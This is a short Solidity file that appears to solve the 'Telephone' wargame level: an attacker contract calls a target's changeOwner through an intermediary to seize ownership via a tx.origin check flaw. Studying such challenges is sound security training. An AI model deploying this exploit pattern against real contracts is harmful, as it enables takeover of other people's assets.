pragma solidity ^0.6.0;

interface TelephoneInterface{
    function changeOwner(address _owner) public;
}

contract TelephoneAttack{
    TelephoneInterface telephone;
    
    constructor(address _telephoneAddress){
        telephone = TelephoneInterface(_telephoneAddress);
    }
    function attack()public{
        telephone.changeOwner(msg.sender);
    }
}